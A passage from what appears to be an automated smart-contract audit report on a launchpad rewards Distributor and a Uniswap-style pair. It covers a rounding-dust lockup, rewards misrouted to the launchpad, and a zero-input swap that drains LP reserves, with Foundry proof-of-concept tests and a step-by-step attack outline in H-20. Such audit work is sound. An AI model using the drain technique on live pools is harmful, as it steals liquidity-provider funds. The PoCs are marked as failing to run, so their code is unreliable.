- Then increment totalPendingRewards by distributedNow (not by the raw deposit). Transfer the full deposit as today; the portion not scheduled (the remainder kept in rs.pending*) will be distributable in future updates, and because it is not counted in totalPendingRewards yet, any eventual per-user flooring dust will remain skimmable (balance - totalPendingRewards).

3) Optional safety: if you prefer to keep the current addRewards flow, add a bounded-dust skim
- Introduce a small configurable dustThreshold and allow owner to skim when balanceOf(asset) - totalPendingRewards[asset] >= dustThreshold.
- This does not fix the root cause but prevents indefinite dust accumulation.

Together, (1) removes the destructive zero-delta wipe and (2) ensures totalPendingRewards mirrors only what is actually claimable, eliminating the permanently locked/unskimmable dust. (3) is an optional belt-and-suspenders fallback.


## [L-17]. Rounding in RewardsTracker + totalPendingRewards causes permanent locked dust that cannot be claimed or skimmed

### Finding Severity Justification: Rounding in accRewardPerShare causes small portions of rewards to be undistributable, and because totalPendingRewards is decreased only on actual transfers, this remainder becomes permanently locked and also unskimmable. This does not enable theft or direct loss of user capital, but it reduces effective distributable yield and traps tokens in the contract. Impact is bounded per distribution and typically small, though some small deposits can be entirely lost when D*PRECISION < totalShares.
## Derived From Pattern/Invariant
Rounding in RewardsTracker permanently locks a portion of deposited rewards

## Exploit Type
RoundingError

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib uses a fixed PRECISION_FACTOR = 1e12 and performs two layers of integer division when distributing rewards:
- First, pending rewards are converted into an increment of acc*RewardPerShare:
  "accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));"
- Later, per-user rewards are computed as:
  "function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
       return (shares * accRewardsPerShare) / PRECISION_FACTOR;
   }"

Both divisions floor, so for a given deposit D and totalShares N, the total distributed to users is strictly less than or equal to D. Any remainder is discarded when update() deletes pendingBaseRewards/pendingQuoteRewards:
"function update(RewardPoolData storage self) internal returns (uint256, uint256) {
    (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards; // remainder is lost
    }
    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards; // remainder is lost
    }
}"

At the same time, Distributor.addRewards increases totalPendingRewards[asset] by the full deposit amount and transfers exactly that many tokens into the contract:
"_increaseTotalPending(asset, amount);\nasset.safeTransferFrom(msg.sender, address(this), amount);"

When update() floors away a portion of each deposit, that dust:
- Remains in the contract's token balance,
- Remains counted in totalPendingRewards[asset], and
- Is never made available to users because acc*RewardPerShare and rewardDebt accounting never expose it.

Because skimExcessRewards only allows withdrawing balanceOf(this) - totalPendingRewards[asset], this dust is *also* unskimmable:
"function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}"

Concrete example:
- Two users each have 1 share (totalShares = 2).
- Someone adds 1 unit of base rewards D = 1.
- getAccRewardsPerShare computes delta = (1 * 1e12) / 2 = 500000000000.
- For each user, totalAccRewards(1, delta) = floor(1 * 500000000000 / 1e12) = 0; so neither can ever claim any of that 1 unit.
- pendingBaseRewards is deleted in update(), but totalPendingRewards[base] is still 1 and the Distributor still holds 1 token.
- Both users later claim and receive 0; totalPendingRewards[base] remains 1, and the owner cannot skim that 1 token because balanceOf - totalPendingRewards == 0.

Over many deposits and many pools, these rounding remainders accumulate into a non-trivial amount of permanently locked tokens.

## Impact
A fraction of every rewards deposit can become permanently unclaimable due to rounding while still counted as pending; these tokens are locked in the contract and cannot be withdrawn by users or admins, slowly draining effective yield and breaking the invariant that all deposited rewards are either claimable or skimmable.

## Command to Run Test


## Proof of Concept
1. Create a rewards pair (A, B) and set up two users U1 and U2, each with 1 share in the pool (totalShares = 2).
2. A sponsor calls addRewards(A, B, 1, 0), depositing 1 unit of A as base rewards. totalPendingRewards[A] += 1 and Distributor now holds 1 A.
3. Due to fixed-point math, getAccRewardsPerShare computes accBaseRewardPerShare increment of 500000000000.
4. getPendingRewards(A, U1) and getPendingRewards(A, U2) both return 0 (because (1 * 500000000000 / 1e12) floors to 0), so from the users' perspective there are no claimable rewards.
5. Both users call claimRewards(A); update() applies the pending rewards to accBaseRewardPerShare and deletes pendingBaseRewards, but their individual baseAmount values are 0, so no tokens are transferred and totalPendingRewards[A] is not decreased.
6. At this point:
   - Distributor.balanceOf(A) == 1,
   - totalPendingRewards[A] == 1,
   - All users have 0 pending rewards.
7. The owner attempts skimExcessRewards(A, 1) but it reverts with SkimOverflow because balanceOf(A) - totalPendingRewards[A] == 0, proving that the 1 unit of A is permanently locked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract DistributorRoundingDustTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;
    address user1 = address(0x1);
    address user2 = address(0x2);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // launchpad
        base = new MockERC20("Base", "B");
        quote = new MockERC20("Quote", "Q");

        distributor.createRewardsPair(address(base), address(quote));

        // Give two users 1 share each (totalShares = 2)
        distributor.increaseStake(address(base), user1, 1);
        distributor.increaseStake(address(base), user2, 1);

        // Sponsor mints 1 unit of base and approves distributor
        base.mint(address(this), 1);
        base.approve(address(distributor), type(uint256).max);
    }

    function testRewardRoundingLocksDust() public {
        // Add exactly 1 unit of base rewards
        distributor.addRewards(address(base), address(quote), 1, 0);

        // Contract holds 1 base and accounting says 1 pending
        assertEq(base.balanceOf(address(distributor)), 1);
        assertEq(distributor.totalPendingRewards(address(base)), 1);

        // Each user sees zero pending rewards due to rounding
        (uint256 pending1,) = distributor.getPendingRewards(address(base), user1);
        (uint256 pending2,) = distributor.getPendingRewards(address(base), user2);
        assertEq(pending1, 0);
        assertEq(pending2, 0);

        // Users attempt to claim but receive nothing
        vm.prank(user1);
        distributor.claimRewards(address(base));
        vm.prank(user2);
        distributor.claimRewards(address(base));

        // Dust remains in contract and is still marked as pending
        assertEq(base.balanceOf(address(distributor)), 1);
        assertEq(distributor.totalPendingRewards(address(base)), 1);

        // Owner cannot skim this dust as excess rewards
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(base), 1);
    }
}


## Suggested Mitigation
Preserve and eventually distribute or explicitly release the rounding remainders instead of discarding them while still counting them in totalPendingRewards. Options include:
- When computing acc*RewardPerShare in update(), also compute how many tokens were actually allocated to users (e.g. distributed = (newAcc - oldAcc) * totalShares / PRECISION_FACTOR) and keep the remainder (pendingRewards - distributed) in pendingBaseRewards/pendingQuoteRewards for the next round.
- Alternatively, after applying the per-share increment, reduce totalPendingRewards[asset] by the undistributable remainder and treat it as immediately skimmable (or send it to a designated fee sink), ensuring totalPendingRewards always reflects the maximum sum of what users can actually claim.

The key is to avoid deleting pendingBaseRewards/pendingQuoteRewards without adjusting totalPendingRewards or tracking the associated dust, so no tokens remain forever locked in the contract.





 **Derived From** : Stake/unstake route user rewards to launchpad (msg.sender) instead of staker

## [H-18]. Stake/unstake in Distributor pay accrued rewards to launchpad instead of the staker, silently stealing user yield

### Finding Severity Justification: Accrued user rewards are transferred to the launchpad contract instead of the intended staker during stake/unstake. The user’s reward debts are advanced, and global pending is reduced, making the loss permanent from the Distributor’s accounting perspective. This results in matured yield being diverted away from users, constituting a direct loss of user assets/yield.
## Derived From Pattern/Invariant
Stake/unstake route user rewards to launchpad (msg.sender) instead of staker

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake / decreaseStake / _distributeAssets

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In `Distributor.increaseStake` and `Distributor.decreaseStake`, pending rewards for a specific user (`account`) are computed by `RewardsTrackerLib.stake/unstake`, but then sent to `msg.sender` (the launchpad contract) instead of the user.

Relevant code:

```solidity
function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }

    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

In `RewardsTrackerLib.stake` / `unstake`, the returned `baseAmount` and `quoteAmount` are **the pending rewards for `user`** (here, `account`), computed before changing that user's shares:

```solidity
function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint96(userData.shares);
    if (existingShares > 0) {
        baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
        quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
    }
    ...
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint256(userData.shares);
    ...
    baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
    quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
    ...
}
```

However, `_distributeAssets` always sends these amounts to `msg.sender`. For `increaseStake`/`decreaseStake`, `msg.sender` is restricted by `onlyLaunchpad` to the trusted launchpad contract, *not* the staker. At the same time:

* `RewardsTrackerLib.stake/unstake` advance `userData.baseRewardDebt` / `quoteRewardDebt` to the latest cumulative index, so from the rewards-accounting perspective the user's accrued rewards are considered fully settled.
* `_decreaseTotalPending` reduces the global `totalPendingRewards[asset]` mapping by the same amount.

Net effect: every time the launchpad adjusts a user's stake (e.g. on bonding-curve buys/sells or internal transfers), any pending AMM/launchpad rewards for that user are **irrevocably paid to the launchpad contract**, while the user's reward debt is updated as if they had received those tokens. The user can only keep rewards that they explicitly claim via `claimRewards` *before* their stake is modified again by the launchpad.

This breaks the invariant that per-user pending rewards tracked by `RewardsTrackerLib` are ultimately paid to that user by `Distributor`. Under normal launchpad flows (users buying/selling through the launchpad), most accrual will be auto-settled via `increaseStake`/`decreaseStake` and diverted to the launchpad instead of the actual staker.

## Impact
For any staker whose shares are adjusted by the launchpad, all accumulated base/quote rewards at that moment are transferred to the launchpad contract while the user's reward debt is advanced. Users permanently lose those rewards unless they manually claim between every launchpad-driven stake change. Over time this can divert the majority of fee rewards away from users to the launchpad.

## Command to Run Test


## Proof of Concept
1. Deploy `Distributor` and initialize it with `launchpad = address(this)` so the test contract is treated as launchpad.
2. Create a rewards pair `(launchAsset, quoteAsset)` via `createRewardsPair`.
3. As launchpad, call `increaseStake(launchAsset, alice, 10)` to give Alice 10 shares.
4. Add base rewards:
   * Mint `reward` units of `launchAsset` to the test contract.
   * Approve `Distributor` and call `addRewards(launchAsset, quoteAsset, reward, 0)`.
   * At this point, `getPendingRewards(launchAsset, alice)` returns a positive `pendingBase`.
5. Record balances: `launchpadBaseBefore = launchAsset.balanceOf(launchpad)` and `aliceBaseBefore = launchAsset.balanceOf(alice)`.
6. As launchpad, call `increaseStake(launchAsset, alice, 1)` again.
   * Inside `rs.stake`, it computes `baseAmount` = Alice's pending rewards and updates her `baseRewardDebt`.
   * `_distributeAssets` then sends `baseAmount` to `msg.sender` (the launchpad) and decrements `totalPendingRewards[launchAsset]`.
7. Verify:
   * `getPendingRewards(launchAsset, alice).pendingBase == 0` (rewards considered paid from the library's perspective).
   * `launchAsset.balanceOf(launchpad) > launchpadBaseBefore` (launchpad received the tokens).
   * `launchAsset.balanceOf(alice) == aliceBaseBefore` (Alice did not receive any tokens).

Thus Alice's accrued rewards were silently siphoned to the launchpad whenever her stake was modified.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BAL");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract DistributorStakeRoutingTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 quoteAsset;

    address launchpad = address(this);
    address alice = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchAsset = new MockERC20();
        quoteAsset = new MockERC20();

        // create rewards pool for (launchAsset, quoteAsset)
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // give Alice some initial shares so totalShares > 0
        distributor.increaseStake(address(launchAsset), alice, 10);
    }

    function testStakeRewardsPaidToLaunchpadNotUser() public {
        // add base rewards
        uint256 reward = 100 ether;
        launchAsset.mint(address(this), reward);
        launchAsset.approve(address(distributor), reward);

        distributor.addRewards(address(launchAsset), address(quoteAsset), uint128(reward), 0);

        // Alice has pending base rewards
        (uint256 pendingBase,) = distributor.getPendingRewards(address(launchAsset), alice);
        assertGt(pendingBase, 0);

        uint256 launchpadBefore = launchAsset.balanceOf(launchpad);
        uint256 aliceBefore = launchAsset.balanceOf(alice);

        // Launchpad adjusts Alice's stake again
        distributor.increaseStake(address(launchAsset), alice, 1);

        // From the library's POV, Alice's pending rewards are now zero
        (uint256 pendingBaseAfter,) = distributor.getPendingRewards(address(launchAsset), alice);
        assertEq(pendingBaseAfter, 0);

        // But the tokens went to the launchpad, not Alice
        assertGt(launchAsset.balanceOf(launchpad), launchpadBefore);
        assertEq(launchAsset.balanceOf(alice), aliceBefore);
    }
}


## Suggested Mitigation
Change `_distributeAssets` to take an explicit recipient address and pass the staker address for stake/unstake flows. For example:

```solidity
function _distributeAssets(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(recipient, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(recipient, quoteAmount);
    }
}

function increaseStake(...) external onlyLaunchpad returns (...) {
    ...
    (baseAmount, quoteAmount) = rs.stake(account, shares);
    _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(...) external onlyLaunchpad returns (...) {
    ...
    (baseAmount, quoteAmount) = rs.unstake(account, shares);
    _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}
```

Leave `claimRewards` calling `_distributeAssets(msg.sender, ...)` so rewards are always sent to the actual claimer.


## [H-19]. increaseStake/decreaseStake send user rewards to launchpad (msg.sender), zeroing user debt and stealing yield

### Finding Severity Justification: increaseStake/decreaseStake compute a user’s pending rewards but transfer them to msg.sender (the Launchpad) instead of the user. User rewardDebts are advanced and totalPendingRewards decreased, so the rewards are irrecoverably removed from the user’s claimable balance. This causes direct loss of user assets during normal operation, not requiring a malicious actor.
## Derived From Pattern/Invariant
Stake/unstake route user rewards to launchpad (msg.sender) instead of staker

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The Launchpad contract code is not included here; it could, by design, forward received rewards to users off-Distributor. However, within the provided Distributor logic, rewards are definitively misdirected during stake updates and accounted as paid, making the issue observable and impactful absent explicit compensating logic elsewhere.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In Distributor, the functions increaseStake and decreaseStake settle a user's pending rewards via RewardsTrackerLib, but then transfer those rewards to msg.sender (the launchpad contract) instead of the user whose rewards were computed.

Relevant code:

- increaseStake/decreaseStake:
  "function increaseStake(address launchAsset, address account, uint96 shares) external onlyLaunchpad returns (uint256 baseAmount, uint256 quoteAmount) {
      RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

      (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
      _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
  }

  function decreaseStake(address launchAsset, address account, uint96 shares) external onlyLaunchpad returns (uint256 baseAmount, uint256 quoteAmount) {
      RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

      (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
      _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
  }"

- Rewards settlement inside RewardsTrackerLib.stake/unstake:
  "if (existingShares > 0) {
      baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
      quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
  }"

- Distribution helper in Distributor:
  "function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
      if (baseAmount > 0) {
          _decreaseTotalPending(base, baseAmount);
          base.safeTransfer(msg.sender, baseAmount);
      }

      if (quoteAmount > 0) {
          _decreaseTotalPending(quote, quoteAmount);
          quote.safeTransfer(msg.sender, quoteAmount);
      }
  }"

The amounts baseAmount and quoteAmount returned by stake/unstake are the pending rewards for the staker (account), but _distributeAssets always sends them to msg.sender. For increaseStake/decreaseStake, msg.sender is the launchpad contract, not account.

At the same time:
- userData.baseRewardDebt / quoteRewardDebt are advanced to the new total accumulated values, so from the reward-tracker perspective the user is fully paid up to the current index;
- totalPendingRewards[asset] is decreased by the same amounts, so the system thinks those rewards have been paid out.

This permanently removes rewards from the user's claimable balance and transfers them to the launchpad whenever the launchpad adjusts a user's stake (e.g. on additional bond purchases or redemptions). The user cannot recover these rewards later via claimRewards, because their rewardDebt has already been advanced past them.

## Impact
Every time the launchpad adjusts a user's stake while they have pending rewards, those rewards are transferred to the launchpad contract instead of the user but are still marked as settled in accounting, causing systematic theft of user yield (base and quote rewards) with no on-chain recovery path.

## Command to Run Test


## Proof of Concept
1. Assume a launch asset A and quote asset B with an existing rewards pool and at least one staker.
2. User U stakes A via the launchpad so that Distributor.increaseStake(A, U, shares) is called once; totalShares > 0 and U has some shares.
3. Some rewards (e.g. A) are added via Distributor.addRewards(A, B, 100, 0); totalPendingRewards[A] increases by 100 and the Distributor holds 100 A.
4. At this point, getPendingRewards(A, U) returns basePending ≈ 100.
5. Later, U buys more through the launchpad; the launchpad calls increaseStake(A, U, extraShares) again.
6. Inside RewardsTrackerLib.stake, baseAmount is computed as U's pending rewards (~100), and userData.baseRewardDebt is advanced to the new cumulative index.
7. Distributor._distributeAssets is then called with base = A and baseAmount ≈ 100; it:
   - calls _decreaseTotalPending(A, 100), reducing totalPendingRewards[A] by 100, then
   - transfers 100 A to msg.sender (the launchpad contract), not to U.
8. U's pending rewards become 0 both from the per-user view and from totalPendingRewards, yet the 100 A are now held by the launchpad. A subsequent claimRewards(A) by U returns 0 and transfers nothing.
9. Repeating stake/unstake updates over time continuously drains users' accrued rewards to the launchpad whenever they have pending rewards at the moment of share changes.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract DistributorStakeLeakTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // this contract is the launchpad
        base = new MockERC20("Base", "B");
        quote = new MockERC20("Quote", "Q");

        // create rewards pair base/quote
        distributor.createRewardsPair(address(base), address(quote));

        // fund launchpad with base and approve distributor for addRewards
        base.mint(address(this), 100 ether);
        base.approve(address(distributor), type(uint256).max);

        // stake 1 share for user so totalShares > 0
        distributor.increaseStake(address(base), user, 1);
    }

    function testStakePaysUserRewardsToLaunchpad() public {
        // add 100 base rewards to the pool
        distributor.addRewards(address(base), address(quote), 100 ether, 0);

        // user has pending base rewards
        (uint256 pendingBase,) = distributor.getPendingRewards(address(base), user);
        assertEq(pendingBase, 100 ether);

        // launchpad adjusts user's stake again, which should settle pending rewards
        distributor.increaseStake(address(base), user, 1);

        // rewards have left the distributor and gone to the launchpad (this contract)
        assertEq(base.balanceOf(address(distributor)), 0);
        assertEq(base.balanceOf(address(this)), 100 ether);

        // user now has zero pending rewards and cannot claim anything
        (pendingBase,) = distributor.getPendingRewards(address(base), user);
        assertEq(pendingBase, 0);

        vm.prank(user);
        (uint256 claimedBase,) = distributor.claimRewards(address(base));
        assertEq(claimedBase, 0);
    }
}


## Suggested Mitigation
Change _distributeAssets so that rewards are sent to the actual beneficiary whose rewards were computed, not to msg.sender. Concretely, either:
- Add a recipient parameter to _distributeAssets and call it from increaseStake/decreaseStake as _distributeAssetsTo(account, ...), or
- Inline the transfer logic in increaseStake/decreaseStake so that base.safeTransfer(account, baseAmount) and quote.safeTransfer(account, quoteAmount) are used while still decrementing totalPendingRewards.

If the launchpad truly needs to collect some portion of rewards, that share should be explicitly split and credited to it via a separate accounting path, without advancing the user’s rewardDebt past unpaid rewards.





 **Derived From** : Launchpad fee accrual breaks Uniswap k-invariant on intra-block swaps

## [H-20]. Accrued launchpad fees can be reused as virtual input to drain LP reserves via zero-input swaps

### Finding Severity Justification: GTELaunchpadV2Pair subtracts accrued launchpad fees from reserves in _update while balances still include them. swap() derives amount{0,1}In from the raw balances, so any undistributed accrued fees are miscounted as fresh input. This enables zero-input swaps to pass the k-invariant and extract the opposite token directly from LP reserves. The attack is permissionless, can be executed intra-block multiple times (timeElapsed == 0), and results in direct loss of pool assets. Although the per-trade extractable amount is bounded by the accrued fees that block, those can be significant for large trades; direct theft from LPs elevates the impact to High.
## Derived From Pattern/Invariant
Launchpad fee accrual breaks Uniswap k-invariant on intra-block swaps

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair tracks launchpad fees separately in `accruedLaunchpadFee0/1` and subtracts them from reserves in `_update`:

- `_update` computes `totalLaunchpadFeeX = accruedLaunchpadFeeX + newLaunchpadFeeX` and then sets:
  `reserve0 = uint112(balance0) - totalLaunchpadFee0;`
  `reserve1 = uint112(balance1) - totalLaunchpadFee1;`

- When `timeElapsed == 0` (multiple `_update` calls in the same block), new fees are only accumulated:
  `accruedLaunchpadFee0 = totalLaunchpadFee0;` / `accruedLaunchpadFee1 = totalLaunchpadFee1;` and **not** distributed out of the pair.

In `swap()` the code then computes `amount{0,1}In` from raw balances that still include these accrued fees, while `_reserve{0,1}` exclude them:

`uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;`
`uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;`

If there are previously accrued but undistributed launchpad fees `A0 = accruedLaunchpadFee0 > 0`, then before a new swap with no token0 output and no real token0 input:
- `balance0 = reserve0 + A0`
- `_reserve0 = reserve0`
- So `amount0In = balance0 - (_reserve0 - 0) = A0` even though the user has not transferred any token0 in this swap.

The Uniswap invariant check then uses this inflated `amount0In`:

`balance0Adjusted = balance0 * 1000 - amount0In * 3;`
`balance1Adjusted = balance1 * 1000 - amount1In * 3;`
`require(balance0Adjusted * balance1Adjusted >= uint256(_reserve0) * _reserve1 * 1000 ** 2);`

For a zero-input swap with `amount0Out = 0` and some `amount1Out = y > 0`, algebra shows the check becomes:

`(R0 + 0.997 * A0) * (R1 - y) >= R0 * R1`,

where `R0,R1` are the reserves before the swap. This inequality permits a positive `y` up to approximately `0.997 * A0 * R1 / (R0 + 0.997 * A0)`, meaning the attacker can withdraw non-trivial `token1` purely by reusing the **previously accrued fee balance `A0` as virtual input**, without sending any real tokens in this swap.

Because `timeElapsed == 0` for all swaps in the same block after the first `_update`, `accruedLaunchpadFee0` persists and can be reused as virtual input in multiple successive swaps in that block. Each such swap can drain additional `token1` from the pool while treating the same `A0` as `amount0In` again and again.

Consequences:
- An attacker can perform a sequence of intra-block swaps, using `accruedLaunchpadFee0` as virtual input to repeatedly withdraw `token1` with **zero real input**, directly stealing liquidity from LPs.
- `_getLaunchpadFees` also computes new launchpad fees on top of this virtual `amount0In`, leading to fees being charged on previously accrued fees (fees-on-fees) and further drifting accounting between the pool and the rewards Distributor.
- The constant-product pricing invariant is broken: the pool allows trades that would be impossible in a correct Uniswap V2 implementation, enabling underpriced extraction of assets.

This is a high-impact accounting invariant violation arising from using balances that include protocol-owned accrued fees to compute `amountIn` and run the K-check, while reserves explicitly exclude those same balances.

## Impact
An attacker can perform zero-input swaps that pass the Uniswap K-invariant by reusing undistributed launchpad fees as virtual input. Within the same block (timeElapsed == 0), accruedLaunchpadFee{0,1} remain in the pair’s token balances but are subtracted from reserves in _update, so swap() miscounts them as fresh input. The attacker can repeatedly call swap in a bundle to withdraw the opposite token with no real input, draining pool reserves beyond the face value of the accrued fees and corrupting pricing. Fees are also computed on top of these virtual inputs, compounding accounting drift. This results in direct, permissionless theft from LPs and broken pricing, qualifying as High severity.

## Command to Run Test


## Proof of Concept
1. Deploy two ERC20 tokens and a GTELaunchpadV2Pair, setting `launchpadLp` to the LP address and `launchpadFeeDistributor` to any non-zero address.
2. LP deposits 1,000,000 of each token into the pair and calls `mint()` once. `_update` sets initial reserves and `blockTimestampLast`.
3. In the same block, a `trader` performs a large token0→token1 swap:
   - `trader` transfers `dx` token0 to the pair.
   - Calls `pair.swap(0, amountOut, trader, new bytes(0))`, with `amountOut` computed using the standard Uniswap getAmountOut formula against current reserves.
   - Because `timeElapsed == 0` in `_update`, the launchpad fees from this swap are not distributed; instead `accruedLaunchpadFee0` is set to a positive `A0` and reserves are set to `reserve0 = balance0 - A0`, `reserve1 = balance1`.
4. Still in the same block, the `attacker` performs a second swap but sends **no token0 in**:
   - Attacker calls `pair.swap(0, y, attacker, new bytes(0))` for some `y > 0`.
   - Before `swap` completes, the pair transfers out `y` units of token1 to the attacker.
   - Since the attacker sent no token0, after the callback balances are `balance0 = reserve0 + A0` (unchanged) and `balance1 = reserve1 - y`.
